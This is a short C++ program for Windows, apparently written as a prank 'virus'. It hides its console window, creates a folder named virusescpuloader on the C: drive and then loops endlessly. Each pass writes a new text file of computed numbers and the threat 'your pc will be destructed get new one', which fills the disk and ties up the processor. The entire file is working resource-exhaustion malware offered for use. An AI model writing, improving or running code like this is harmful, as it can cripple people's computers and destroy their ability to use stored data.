#include<bits/stdc++.h>
#include<direct.h>
#include<windows.h>
using namespace std;
int main(){
    FreeConsole();
    long a=0;
    const char* path="c:\\virusescpuloader\\";
    string msg="your pc will be destructed get new one>>>>>>>";
    mkdir(path);
    while (true)
    {
        a++;
        ofstream cpu;
        cpu.open(path+to_string(a)+".txt",ios_base::out);
        double result = 0.0;
        for (int i = 0; i < 1000; i++) {
            result += std::sin(i) * std::cos(i);
        cpu<<result;
        // Consume RAM
        }
        cpu<<msg;
         for (int i = 0; i < 1000; i++) {
            result += std::sin(i) * std::cos(i);
        cpu<<result;
        // Consume RAM
        }
        cpu<<msg;
         for (int i = 0; i < 1000; i++) {
            result += std::sin(i) * std::cos(i);
        cpu<<result;
        // Consume RAM
        }
        cpu<<msg;
        cpu.close();
        // cout<<"file is created."<<endl;
    }
    
    return 0;
}